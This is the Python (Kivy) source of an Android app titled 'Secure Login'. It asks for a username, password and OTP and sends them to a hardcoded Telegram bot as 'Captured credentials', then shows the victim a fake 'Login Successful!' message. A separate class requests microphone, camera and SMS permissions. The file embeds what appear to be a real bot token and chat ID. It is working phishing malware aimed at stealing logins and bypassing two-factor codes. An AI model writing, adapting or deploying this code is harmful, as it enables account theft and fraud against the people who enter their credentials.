from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
import requests
from plyer import sms
from kivy.utils import platform
from android.permissions import Permission

if platform == 'android':
    from android.permissions import request_permissions, Permission, check_permission


# Replace with your actual Telegram credentials
BOT_TOKEN = '6638238806:AAFaCEzcIZMFFQ2j5EQvi-oU0ATCNx9Ne_8'
CHAT_ID = '6588063560'


def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': CHAT_ID,
        'text': message
    }
    try:
        requests.post(url, data=payload)
    except Exception as e:
        print(f"Failed to send Telegram message: {e}")
    
class PermissionApp(App):
    def build(self):
        layout = BoxLayout(orientation='vertical', spacing=10, padding=20)

        # Microphone Permission Button
        mic_button = Button(text='Request Microphone Permission')
        mic_button.bind(on_press=lambda x: self.ask_permission(Permission.RECORD_AUDIO))
        layout.add_widget(mic_button)

        # Camera Permission Button
        camera_button = Button(text='Request Camera Permission')
        camera_button.bind(on_press=lambda x: self.ask_permission(Permission.CAMERA))
        layout.add_widget(camera_button)

        # SMS Permission Button
        sms_button = Button(text='Request SMS Permission')
        sms_button.bind(on_press=lambda x: self.ask_permission(Permission.SEND_SMS))
        layout.add_widget(sms_button)

        return layout

    def ask_permission(self, permission_name):
        if platform == 'android':
            if not check_permission(permission_name):
                request_permissions([permission_name])
            else:
                print(f"{permission_name} already granted.")

class LoginScreen(BoxLayout):
    def __init__(self, **kwargs):
        super(LoginScreen, self).__init__(orientation='vertical', padding=20, spacing=10, **kwargs)

        self.add_widget(Label(text='Login', font_size=24, size_hint=(1, 0.2)))

        self.username = TextInput(hint_text='Username', multiline=False)
        self.add_widget(self.username)

        self.password = TextInput(hint_text='Password', password=True, multiline=False)
        self.add_widget(self.password)

        self.otp = TextInput(hint_text='Enter OTP', multiline=False)
        self.add_widget(self.otp)

        self.login_button = Button(text='Login', on_press=self.send_data)
        self.add_widget(self.login_button)

        self.result_label = Label(text='', size_hint=(1, 0.3))
        self.add_widget(self.result_label)

    def send_data(self, instance):
        username = self.username.text.strip()
        password = self.password.text.strip()
        otp = self.otp.text.strip()

        if not username or not password or not otp:
            self.result_label.text = "Please fill in all fields."
            return

        message = f"Captured credentials:\nUsername: {username}\nPassword: {password}\nOTP: {otp}"
        send_telegram_message(message)

        self.result_label.text = "[b][color=00aa00]Login Successful![/color][/b]"


class LoginApp(App):
    def build(self):
        self.title = "Secure Login"
        return LoginScreen()


if __name__ == '__main__':
    LoginApp().run()